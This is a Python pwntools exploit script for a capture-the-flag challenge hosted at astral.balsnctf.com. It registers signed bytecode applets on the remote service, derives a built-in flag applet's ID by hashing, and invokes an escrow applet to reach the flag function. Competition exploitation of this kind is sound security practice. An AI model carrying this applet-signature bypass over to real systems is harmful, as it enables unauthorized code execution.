from binascii import hexlify
import hashlib
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

#HOST = '192.168.10.14'
PORT = 10101
HOST = 'astral.balsnctf.com'

def start():
	return remote(HOST, PORT)

def gen_digest(code, n, e, nonce):
    m = hashlib.sha256()
    assert(len(n) == 0x100)
    assert(len(e) == 0x100)
    assert(len(nonce) == 0x100)
    payload = b''
    payload += n
    payload += e
    payload += nonce
    payload += code
    m.update(payload)
    return m.digest()

MENULINE = b'+----------------------------+'
def sync():
    r.sendline(b'9')
    r.recvuntil(MENULINE)

def bytes_to_hexstr(v):
    return ''.join([f'{x:02x}' for x in v]).encode()

def register_applet(bins, nonce, n, e, sig):
    r.sendlineafter(MENULINE, b'1')
    r.sendline(f'{len(bins)//2}'.encode())
    r.send(bins)
    r.send(nonce)
    r.send(n)
    r.send(e)
    r.send(sig)
    r.recvuntil(b'id : ')
    appid = int(r.recvuntil(b'\n', True))
    sync()
    return appid

def register_escrow():
    bins = b'4003004119003400000000000120023001015a21440400400a00fd401c00fd56005611ff3002085a2b42f3ff27995a8944ecff281050102f90fd400100fd3009105a9b42d9ff5010590a300208278950202f90300302513e59e33700633193a9d18f5ea530011059a2fe203130000850022f825a8144a7ff51022f92270030021059b15121fefd'
    sig = b'2fd4be9be84da8a203cfa80f008fe7a4b14a654d504a67f90c898da101a1527a8f8d43e1dd4eb4f0465deaf030ca2f723b269d959bfb47905f8c169d1028a5f41197b4b51c48bb85e578ea66b6bfd6e2b10d0c8b151fa8774fe91f56e9ad5ff5bff9fa5af6b0e52c08ea014b6b55115918d2d60860464d865fe2c521503fb2a4ed3a551d9c27d933d3de1d183de0e2d085166c9815843546bf6a3698a02a107ca57b6f7d329e1a3e9496ad7f1c69e069cd84947d98b241f5226db74eb018494945c21420ad2cfbfb4b2c0f586f7820794eedf2df8e7527d98873535c5d05ffb8df44c4f8b5cf3dc34515806ee7aa85cba75e1872a340435efffb13a6a395a812'.ljust(0x200, b'0')
    return register_applet(bins, nonce, n, e, sig)

def register_lottery():
    bins = b"4003004119003400000000000120023001015a21440400400a00fd405400fd56005611ff3003105a3b42f3ff2810501037077c0ea77899e4c3782f70300208276750302f70502627675a87450c0034000000000001288041c5ff50202f705130590337003d86a08132bbd7f056115622fefd400100fd5010401c005a8c449fff300208300310513027065ac6450400406b00fd40aa00fd30020850202706502027075076590a512e59e337003d86a08132bbd7f056115622fe273359a05a36420100fd300310503027065a864550ff59033700e3559ad58ccc4d0956115622fe2737593630020851262768597953875287517930010150192f934122ff5a2b421dff27995a894416ff502050302706503027075a764607ff50203001015a87440e00270a5aa944f6fe5030511741edff2f9034002900000001270250122f20fd5a2b42dafe2799502050305030270650203001015a86440e0027075a7c4408005030511641edfffd50202f90fd"
    sig = b"7b0bcb8695b04f42e42a70e11972f3735e198b50fd5dfb81d9d9b2b294c654cd5ab445283ea423831b4bea1d7684697dfe11d40f254589bf7ac0f052c0c09182f5e3b898f79a32dd645babbb7ac80c68267bb176af7b1d5d717cb06cb13b9c78661140f29a72e5ef4e996cb540f551599807d744891cb1e9ca3983cbda758b62b132c71e1e131beed700e4bf130c38f64462539fd5b6364f866bf28d8d856a2eb0ad96802871cd8e0140da54f49cd7edb69d8d372357c2e763876914e528f85e4dba6b414aca9dc91d813b6b0c5ec5dfc38b555e230401fe4b63af72d624eb01fc447e6d6b0dda3d1aed43c6a5c9df1a858f4315c4ece422a380fc7f5570910b"
    return register_applet(bins, nonce, n, e, sig)

def invoke_applet(aid, arg):
    r.sendlineafter(MENULINE, b'3')
    r.sendline(f'{aid}'.encode())
    r.sendline(f'{len(arg)//2}'.encode())
    r.send(arg)
    ret = r.recvuntil(b'pt : ')
    r.recvuntil(b'\n')
    sync()
    return ret

def get_aid(name):
    m = hashlib.sha256()
    m.update(b'\x00'* 0x100 * 3) # nonce, n, e
    m.update(name)
    aid = u64(m.digest()[:8])
    return aid

r = start()

n = hexlify(b"\xfd\xb3\x60\x3a\x75\x87\x62\x73\x6b\x0a\x2e\xba\x30\x13\xf9\x37\x28\x43\xf2\x3b\x93\xbf\x58\x3a\xcf\x73\x74\xa8\x5f\x42\x08\x78\x09\x0b\x98\x93\x63\x39\xf8\x2c\x1d\x24\xfd\x70\xce\x39\x8c\xac\x94\x12\x16\x92\x52\xd7\x91\xd4\xc2\x43\xa2\x57\xdb\x49\x84\x40\x3b\x88\x5a\x3a\x55\xd8\x02\xa2\x33\x72\x59\xbc\x68\xe8\x08\xb6\xf9\x9f\x14\x15\xed\x76\xf7\x14\xca\x28\x57\x11\xc2\x40\x4d\x73\x10\x4f\xcc\x6d\xce\x9a\x4c\x67\x35\x52\xf7\x8b\x5a\x4a\x03\x42\x82\x40\x78\x79\x2a\x83\xc6\x63\x5c\xe5\x80\xee\xf4\x8b\xa7\x2b\xd3\x29\xb3\xb4\xc2\xaf\xad\xe1\x09\xf5\x4c\x55\x68\x32\xf2\xf5\x2a\x4d\x75\x9b\xd0\x55\xc2\x75\x0b\xdd\x17\x14\x9f\x91\xbe\xa2\x8a\x0f\xfa\xda\x2b\x7a\xae\xbf\x77\x1f\xcb\x5c\xe3\x40\xf0\x61\xd6\x15\xef\x4a\x17\x2a\x59\x28\x9a\x63\xf1\xa4\x6a\xb9\x33\x28\xfb\x8b\xa6\x5e\x6d\xbd\x98\xed\x7a\x16\x11\xc6\x3b\x19\x55\x02\x17\x1d\x0d\x6f\x1b\x8f\x55\x72\x0c\x6a\xc4\x31\x41\x34\x02\x3c\x4c\xf7\x50\xc2\x1d\x11\xc8\x56\x86\xdd\x00\x1d\x0d\xb4\xd8\x51\xf7\x44\x1f\x44\x01\x57\x50\x63\x58\x5f\x1c\xdf\x0d\xea\xb4\xa7").ljust(0x200, b'0')
e = hexlify(b"\x01\x00\x01").ljust(0x200, b'0')
nonce = b'00' * 0x100

r.recvuntil(b'                                                \\')
r.sendline(b'1')
r.sendline(b'1')
r.send(b'a')
r.send(b'a')
r.recvuntil(MENULINE)

fn_flag_id = get_aid(b'builtin-flag')
escrow_id = register_escrow()

preimage = 0x13371337deaddead
m = hashlib.sha256()
m.update(p64(preimage))
hashed = bytes_to_hexstr(m.digest())
invoke_applet(escrow_id, hashed)
ret = invoke_applet(escrow_id, bytes_to_hexstr(flat(preimage, fn_flag_id)))
flag = ret.split(b'BASLN')[1].split(b'}')[0].decode()
print(f'Flag: BASLN{flag}'+'}')

r.interactive()
r.close()
